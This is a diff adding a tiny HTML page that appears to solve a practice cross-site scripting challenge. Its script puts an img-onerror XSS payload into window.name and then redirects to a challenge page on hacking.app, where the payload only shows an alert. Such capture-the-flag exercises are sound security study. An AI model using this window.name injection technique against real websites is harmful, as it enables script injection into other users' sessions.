@@ -1,0 +1,10 @@
+<!doctype HTML>
+<html>
+    <body>
+        You shouldn't see this
+        <script>
+            window.name = '<img onerror="alert(\'WOHOOOO XSS IS FUN!\');" src="abc" />';
+            window.location.href = "https://hacking.app/xss/xss_chall1.html";
+        </script>
+    </body>
+</html>
